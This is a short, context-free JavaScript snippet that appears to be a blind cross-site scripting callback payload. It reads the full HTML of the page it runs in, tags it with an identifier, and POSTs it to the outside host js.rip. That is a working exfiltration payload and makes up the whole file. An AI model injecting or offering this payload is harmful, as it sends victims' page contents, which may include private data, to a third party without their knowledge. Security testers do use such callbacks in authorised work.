var form_data = new FormData();
form_data.append("path", "jo7192uhit");
form_data.append("dom", document.documentElement.outerHTML);

var http = new XMLHttpRequest();
var url = "https://js.rip/js_callback";

http.open("POST", url, true);

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
    }
}

http.send(form_data);
